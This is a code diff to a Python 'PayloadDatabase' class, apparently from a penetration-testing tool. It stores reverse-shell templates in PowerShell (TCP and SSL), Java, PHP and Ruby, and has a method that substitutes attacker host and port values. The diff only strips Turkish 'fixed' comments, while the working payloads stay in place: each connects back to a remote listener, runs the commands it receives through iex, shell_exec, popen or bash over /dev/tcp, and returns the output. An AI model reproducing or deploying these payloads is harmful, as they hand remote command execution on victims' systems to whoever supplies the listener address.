@@ -75,13 +75,13 @@ class PayloadDatabase:
         "powershell_tcp": (
             "$c=New-Object Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});"
             "$s=$c.GetStream();"
-            "[byte[]]$b=0..65535|%{0};"  # DÜZELTİLDİ: %{{0}} -> %{0}
-            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){" # DÜZELTİLDİ: {{ -> {
+            "[byte[]]$b=0..65535|%{0};" 
+            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){" 
             "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
             "$sb=(iex $d 2>&1|Out-String);"
             "$sb2=$sb+'PS '+(pwd).Path+'> ';"
             "$bt=([text.encoding]::ASCII).GetBytes($sb2);"
-            "$s.Write($bt,0,$bt.Length);$s.Flush()};" # DÜZELTİLDİ: }} -> }
+            "$s.Write($bt,0,$bt.Length);$s.Flush()};" 
             "$c.Close()"
         ),
         "powershell_udp": (
@@ -100,17 +100,17 @@ class PayloadDatabase:
             "$r=New-Object IO.StreamReader($ssl);"
             "$w=New-Object IO.StreamWriter($ssl);"
             "$w.AutoFlush=$true;"
-            "while(($d=$r.ReadLine()) -ne $null){$w.Write((iex $d|Out-String))}" # DÜZELTİLDİ
+            "while(($d=$r.ReadLine()) -ne $null){$w.Write((iex $d|Out-String))}" 
         ),
         "java_runtime": (
             "r=Runtime.getRuntime();"
-            "p=r.exec(new String[]{\"bash\",\"-c\"," # DÜZELTİLDİ: {{ -> {
-            "\"exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5|while read l;do $l 2>&5 >&5;done\"});" # DÜZELTİLDİ
+            "p=r.exec(new String[]{\"bash\",\"-c\"," 
+            "\"exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5|while read l;do $l 2>&5 >&5;done\"});" 
             "p.waitFor()"
         ),
         "java_process": (
-            "String[] cmd={\"bash\",\"-c\"," # DÜZELTİLDİ
-            "\"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"};" # DÜZELTİLDİ
+            "String[] cmd={\"bash\",\"-c\"," 
+            "\"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"};"
             "Runtime rt=Runtime.getRuntime();"
             "Process proc=rt.exec(cmd);proc.waitFor();"
         ),
@@ -123,7 +123,7 @@ class PayloadDatabase:
         ),
         "php_shell_exec": (
             "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});"
-            "while(!feof($s)){$c=fgets($s,1024);$o=shell_exec($c);" # DÜZELTİLDİ
+            "while(!feof($s)){$c=fgets($s,1024);$o=shell_exec($c);" 
             "fputs($s,$o);}'"
         ),
         "php_pentestmonkey": (
@@ -133,12 +133,12 @@ class PayloadDatabase:
         "ruby_tcp": (
             "ruby -rsocket -e 'exit if fork;"
             "c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");"
-            "while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'" # DÜZELTİLDİ
+            "while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'" 
         ),
         "ruby_bash": (
             "ruby -rsocket -e "
             "'c=TCPSocket.new(\"{LHOST}\",{LPORT});"
-            "while(l=c.gets);IO.popen(l.chop,\"r\"){|f|c.print f.read}end'" # DÜZELTİLDİ
+            "while(l=c.gets);IO.popen(l.chop,\"r\"){|f|c.print f.read}end'" 
         ),
         "ruby_no_fork": (
             "ruby -rsocket -e "
@@ -197,4 +197,5 @@ class PayloadDatabase:
         template = cls.get(key)
         if template is None:
             return None
+
         return template.replace('{LHOST}', lhost).replace('{LPORT}', str(lport))
